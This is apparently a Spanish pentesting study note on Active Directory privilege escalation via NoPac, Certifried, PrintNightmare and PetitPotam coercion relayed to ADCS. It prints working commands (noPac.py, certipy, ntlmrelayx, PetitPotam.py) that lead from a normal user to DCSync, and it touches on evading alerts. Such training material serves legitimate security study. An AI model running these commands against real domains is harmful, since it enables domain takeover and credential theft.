---
tags:
  - Active-Directory
  - Windows
  - Linux
  - Pentesting/Explotacion
Fecha de actualización: 2026-07-21
Nota previa: "[[17 - El problema Double Hop de Kerberos]]"
Nota siguiente: "[[19 - Configuraciones erróneas varias]]"
Area: "[[AD Escalada y movimiento.base|Escalada y movimiento]]"
---
---

Cada cierto tiempo aparece una vulnerabilidad específica de AD que <mark style="background: #FFB86CA6;">lleva de un usuario cualquiera a Domain Admin en minutos</mark>. HTB cubre tres clásicas de 2021; la clave en 2026 es saber <mark style="background: #FFB8EBA6;">cuáles siguen vivas y cuál es el patrón que perdura</mark>.

# NoPac (CVE-2021-42278 + CVE-2021-42287)

*SamAccountName spoofing*: renombras una cuenta de equipo que controlas para suplantar al DC y obtienes un TGS como `SYSTEM` del DC → shell o DCSync directo.

```shell-session
$ noPac.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host DC01 --impersonate administrator -dump
```

Parcheada en noviembre de 2021, pero letal donde no se aplicó.

# Certifried (CVE-2022-26923)

La fusión de sAMAccountName spoofing con ADCS: <mark style="background: #FF5582A6;">un usuario estándar puede crear una cuenta de máquina</mark> (cuota por defecto `ms-DS-MachineAccountQuota=10`), falsificarle el `dNSHostName` para suplantar a un DC, y pedir un certificado de autenticación de máquina cuyo mapeo se resuelve por ese `dNSHostName` falso → certificado utilizable **como el DC** → TGT → DCSync.

```shell-session
$ certipy account update -u user@domain.local -p pass -user 'EVILPC$' -dns-hostname dc01.domain.local
$ certipy req -u 'EVILPC$' -p pass -ca <CA> -template Machine
```

Parcheada en mayo de 2022 (CVSS 8.8), pero sigue viva donde no se aplicó — hoy más habitual que noPac.

# PrintNightmare (CVE-2021-34527, hermana de CVE-2021-1675)

RCE/LPE en el servicio `Print Spooler`. <mark style="background: #FFB8EBA6;">El spooler sigue activo por defecto en muchos servidores</mark> (incluidos DCs mal endurecidos), así que compruébalo aunque el CVE sea viejo.

# PetitPotam y el patrón que perdura

`PetitPotam` (MS-EFSRPC) **coacciona** al DC para que se autentique contra ti. Por sí solo no es nada; combinado, es demoledor:

<mark style="background: #FF5582A6;">coacción → NTLM relay → ADCS</mark>. Fuerzas al DC a autenticarse, retransmites (`ntlmrelayx`, el mismo de [[06 - Envenenamiento LLMNR y NBT-NS]]) esa autenticación al servicio de inscripción web de `ADCS` (ESC8) y obtienes un **certificado del DC**, que canjeas por un TGT y usas para DCSync.

```shell-session
$ impacket-ntlmrelayx -t http://ca01/certsrv/certfnsh.asp -smb2support --adcs
$ python3 PetitPotam.py <attacker-ip> <dc-ip>
```

> [!info]+ El vector durable de 2026: coerción + relay + ADCS
> **NoPac** y **PrintNightmare** están parcheados por defecto (parche de código) en sistemas actualizados. **PetitPotam no**: el parche de 2021 (`CVE-2021-36942`) solo cerró la invocación **no autenticada**; con cualquier credencial de dominio válida sigue coaccionando hoy — su mitigación real es de **configuración** (EPA en ADCS, SMB signing, restringir NTLM), no un parche que lo neutralice. Y eso es justo lo que no envejece: el patrón **coacción→relay→ADCS**. `Coercer` unifica los métodos de coacción (PetitPotam, PrinterBug, DFSCoerce…) y `Certipy` explota toda la familia de misconfiguraciones ADCS (`ESC1`-`ESC17`). Un ADCS mal configurado es hoy la vía más limpia a Domain Admin; el detalle de canjear certificados por credenciales está en [[15 - Pass the Certificate]].

> [!warning]+ Comprueba siempre el parche
> Antes de lanzar un exploit *bleeding-edge*, confirma el nivel de parche del objetivo: en un dominio al día son ruido inútil que dispara alertas. Su sitio es el entorno desactualizado —que abundan—. Telemetría en [[25 - Detección y evasión en AD]].
